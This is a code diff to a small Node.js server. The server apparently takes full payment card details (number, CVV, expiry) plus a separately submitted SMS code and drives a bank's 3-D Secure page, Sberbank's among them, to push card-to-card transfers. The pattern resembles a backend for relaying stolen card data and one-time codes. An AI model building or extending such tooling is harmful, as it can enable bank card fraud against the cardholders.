@@ -11,6 +11,7 @@ const https = require("https"),
   fs = require("fs");
 
 const obj = {};
+const id_res = {};
 
 const scenarios = {
   'acs1.sbrf.ru': sberbank,
@@ -30,6 +31,7 @@ app.use(bodyParser.json())
 app.use(cors())
 
 const bankSMSProcess = async (url, page, sms) => {
+  
   const {hostname} = new URL(url)
   await scenarios[hostname](page, sms)
 }
@@ -108,14 +110,14 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) =
 app.post('/sendData', async (req, res) => {
         const {toCard,amount, fromCard, cvv, expireDate, email, id} = req.body
         obj[id] = null
-        const result = await write_data(toCard,amount, fromCard, cvv, expireDate, email, id)
-        return res.status(200).json({ok: !!result, id})
+        res.status(200)
+        id_res[id] = write_data(toCard,amount, fromCard, cvv, expireDate, email, id)
 })
 
 app.get('/token/:id/:code', async (req, res) => {
   const {id, code} = req.params
   obj[id] = code
-  return res.status(200).send()
+  return res.status(200).json({ok: await id_res[id],id})
 })
 
 app.listen(5000)
